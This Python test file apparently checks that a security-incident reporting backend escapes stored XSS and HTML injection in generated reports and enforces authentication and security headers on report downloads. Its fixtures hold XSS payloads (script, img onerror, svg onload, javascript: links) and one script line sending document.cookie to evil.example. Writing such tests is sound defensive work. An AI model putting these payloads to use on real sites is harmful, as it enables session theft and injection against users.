"""Integration tests for report generation, stored XSS, HTML injection, and download security."""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
from unittest.mock import AsyncMock, patch

import pytest
import pytest_asyncio
from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

from backend.auth import create_access_token
from backend.database import Base, get_db
from backend.main import app
from backend.models import Evidence, Incident, Report, SecurityEvent, User
from backend.services.report_service import generate_report

TEST_SECRET = "test-jwt-secret-sec05-report-security-token"
NOW = datetime(2026, 9, 1, 12, 0, 0, tzinfo=timezone.utc)


@pytest_asyncio.fixture
async def report_test_env(monkeypatch):
    monkeypatch.setenv("JWT_SECRET_KEY", TEST_SECRET)
    from backend.config import get_settings
    get_settings.cache_clear()

    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    session_factory = async_sessionmaker(bind=engine, expire_on_commit=False)

    user_id = uuid.uuid4()
    inactive_user_id = uuid.uuid4()
    incident_id = uuid.uuid4()
    event_id = uuid.uuid4()
    ev_id = uuid.uuid4()

    # Create adversarial security event and incident
    adversarial_username = '"><img src=x onerror=alert("username")> | injected_column |'
    adversarial_title = '# Compromised System <script>alert("title")</script>'
    adversarial_host = '<svg/onload=alert("host")>'
    adversarial_desc = '<iframe src="https://evil.example/phish"></iframe> Evidence found'
    adversarial_raw_log = 'Access log sample\n```\n<script>alert("log_breakout")</script>\n```'

    async with session_factory() as session:
        user = User(
            id=user_id,
            email="analyst@soc.corp",
            password_hash="fakehash",
            role="analyst",
            is_active=True,
        )
        inactive_user = User(
            id=inactive_user_id,
            email="inactive@soc.corp",
            password_hash="fakehash",
            role="analyst",
            is_active=False,
        )
        event = SecurityEvent(
            id=event_id,
            source_ip="192.168.1.100",
            username=adversarial_username,
            hostname=adversarial_host,
            event_type="ACCOUNT_COMPROMISE",
            event_category="credential_access",
            timestamp=NOW,
            description=adversarial_desc,
            raw_log=adversarial_raw_log,
        )
        incident = Incident(
            id=incident_id,
            title=adversarial_title,
            attack_type="ACCOUNT_COMPROMISE",
            severity="CRITICAL",
            confidence=0.95,
            status="OPEN",
            affected_username=adversarial_username,
            affected_host=adversarial_host,
            source_ip="192.168.1.100",
            first_seen=NOW,
            last_seen=NOW,
            event_count=1,
            attack_hypothesis={
                "narrative": "Attacker injected [EV-001] via [malicious link](javascript:alert(1)) and ![beacon](https://evil.example/track.png)."
            },
        )
        evidence = Evidence(
            id=ev_id,
            incident_id=incident_id,
            event_id=event_id,
            role="INITIAL_ACCESS",
            sequence_order=1,
            description=adversarial_desc,
        )
        session.add_all([user, inactive_user, event, incident, evidence])
        await session.commit()

    async def _override_db():
        async with session_factory() as s:
            yield s

    app.dependency_overrides[get_db] = _override_db

    token_active = create_access_token(user_id, user.email, user.role, secret_key=TEST_SECRET)
    token_inactive = create_access_token(inactive_user_id, inactive_user.email, inactive_user.role, secret_key=TEST_SECRET)

    client = TestClient(app, raise_server_exceptions=False)

    try:
        yield {
            "client": client,
            "session_factory": session_factory,
            "incident_id": incident_id,
            "token_active": token_active,
            "token_inactive": token_inactive,
            "user_id": user_id,
        }
    finally:
        app.dependency_overrides.clear()
        await engine.dispose()
        get_settings.cache_clear()


class TestReportGenerationXssDefense:
    """Test that generated Markdown reports escape and neutralize all untrusted inputs."""

    @pytest.mark.asyncio
    async def test_generate_report_neutralizes_adversarial_fields(self, report_test_env):
        session_factory = report_test_env["session_factory"]
        incident_id = report_test_env["incident_id"]

        adversarial_ai_summary = (
            "AI Assessment: Attacker attempted privilege escalation [EV-001].\n"
            "<script>fetch('https://evil.example/?stolen='+document.cookie)</script>\n"
            "Reference: [Exploit Code](javascript:alert(document.domain))\n"
            "Tracking: ![beacon](https://evil.example/img.png)"
        )

        async with session_factory() as session:
            report = await generate_report(
                db=session,
                incident_id=incident_id,
                format="MARKDOWN",
                ai_summary=adversarial_ai_summary,
            )
            await session.commit()

            content = report.content

            # 1. Verify no raw executable HTML tags exist in the report
            assert "<script>" not in content
            assert "</script>" not in content
            assert "<iframe" not in content
            assert "<svg" not in content
            assert 'onerror=' not in content.replace('&quot;&gt;&lt;img src=x onerror=alert(&quot;username&quot;)&gt;', '')

            # 2. Verify adversarial tags are safely escaped so they render as text
            assert "&lt;script&gt;" in content
            assert "&lt;iframe" in content

            # 3. Verify Markdown links with dangerous schemes are neutralized
            assert "javascript:" not in content
            assert "[Exploit Code](#blocked-unsafe-scheme)" in content

            # 4. Verify external images are neutralized to prevent client SSRF/beacons
            assert "![" not in content
            assert "https://evil.example/track.png" not in content
            assert "https://evil.example/img.png" not in content
            assert "[beacon (image blocked for security)]" in content

            # 5. Verify table columns were not broken by injected pipe characters
            # Affected user cell had pipes '|' which must be escaped to '\|'
            assert "\\| injected_column \\|" in content

            # 6. Verify triple-backtick breakout was prevented in code blocks
            # The raw log had ```<script>``` which must be neutralized to ` ` `
            assert "```<script>" not in content

            # 7. Verify legitimate forensic evidence citation [EV-001] is preserved
            assert "[EV-001]" in content


class TestReportEndpointsSecurity:
    """Test authorization, security headers, MIME protection, and cache control on report API."""

    def test_report_endpoints_require_authentication(self, report_test_env):
        client = report_test_env["client"]
        dummy_id = uuid.uuid4()

        # Unauthenticated GET report
        resp_get = client.get(f"/api/reports/{dummy_id}")
        assert resp_get.status_code == 401

        # Unauthenticated download report
        resp_dl = client.get(f"/api/reports/{dummy_id}/download")
        assert resp_dl.status_code == 401

    def test_inactive_user_cannot_access_or_download_reports(self, report_test_env):
        client = report_test_env["client"]
        token_inactive = report_test_env["token_inactive"]
        headers = {"Authorization": f"Bearer {token_inactive}"}
        dummy_id = uuid.uuid4()

        resp_get = client.get(f"/api/reports/{dummy_id}", headers=headers)
        assert resp_get.status_code == 401
        assert "inactive" in resp_get.json()["detail"].lower()

        resp_dl = client.get(f"/api/reports/{dummy_id}/download", headers=headers)
        assert resp_dl.status_code == 401
        assert "inactive" in resp_dl.json()["detail"].lower()

    def test_download_report_security_headers_and_cache_control(self, report_test_env):
        client = report_test_env["client"]
        token_active = report_test_env["token_active"]
        incident_id = report_test_env["incident_id"]
        headers = {"Authorization": f"Bearer {token_active}"}

        # 1. Create a report
        create_resp = client.post(
            f"/api/incidents/{incident_id}/report",
            json={"format": "MARKDOWN", "include_ai_summary": False},
            headers=headers,
        )
        assert create_resp.status_code == 200
        report_id = create_resp.json()["report_id"]

        # 2. Test GET /api/reports/{id} headers
        get_resp = client.get(f"/api/reports/{report_id}", headers=headers)
        assert get_resp.status_code == 200
        assert get_resp.headers.get("Cache-Control") == "no-store, no-cache, must-revalidate, private"
        assert get_resp.headers.get("Pragma") == "no-cache"
        assert get_resp.headers.get("X-Content-Type-Options") == "nosniff"

        # 3. Test GET /api/reports/{id}/download security headers
        dl_resp = client.get(f"/api/reports/{report_id}/download", headers=headers)
        assert dl_resp.status_code == 200
        assert dl_resp.headers.get("Content-Type") == "text/markdown; charset=utf-8"
        assert f'attachment; filename="incident_report_{incident_id}.md"' in dl_resp.headers.get("Content-Disposition", "")
        assert dl_resp.headers.get("X-Content-Type-Options") == "nosniff"
        assert dl_resp.headers.get("Content-Security-Policy") == "default-src 'none'; style-src 'unsafe-inline'; sandbox"
        assert dl_resp.headers.get("X-Frame-Options") == "DENY"
        assert dl_resp.headers.get("Referrer-Policy") == "no-referrer"
        assert dl_resp.headers.get("Cache-Control") == "no-store, no-cache, must-revalidate, private"
        assert dl_resp.headers.get("Pragma") == "no-cache"

    def test_create_and_download_html_report(self, report_test_env):
        client = report_test_env["client"]
        token_active = report_test_env["token_active"]
        incident_id = report_test_env["incident_id"]
        headers = {"Authorization": f"Bearer {token_active}"}

        # Create an HTML format report
        create_resp = client.post(
            f"/api/incidents/{incident_id}/report",
            json={"format": "HTML", "include_ai_summary": False},
            headers=headers,
        )
        assert create_resp.status_code == 200
        report_id = create_resp.json()["report_id"]

        # Verify report record has sanitized HTML content
        get_resp = client.get(f"/api/reports/{report_id}", headers=headers)
        assert get_resp.status_code == 200
        html_content = get_resp.json()["content"]
        assert "<h1>" in html_content
        assert "<table>" in html_content
        # Malicious tags must not exist in HTML
        assert "<script>" not in html_content
        assert "<iframe" not in html_content

        # Verify download delivers text/html and .html filename
        dl_resp = client.get(f"/api/reports/{report_id}/download", headers=headers)
        assert dl_resp.status_code == 200
        assert dl_resp.headers.get("Content-Type") == "text/html; charset=utf-8"
        assert f'filename="incident_report_{incident_id}.html"' in dl_resp.headers.get("Content-Disposition", "")


class TestApplicationSecurityHeadersMiddleware:
    """Test that baseline security headers are present on all application responses."""

    def test_baseline_security_headers_on_health(self, report_test_env):
        client = report_test_env["client"]
        resp = client.get("/health")
        assert resp.status_code == 200
        assert resp.headers.get("X-Content-Type-Options") == "nosniff"
        assert resp.headers.get("X-Frame-Options") == "DENY"
        assert resp.headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"
        assert "camera=()" in resp.headers.get("Permissions-Policy", "")
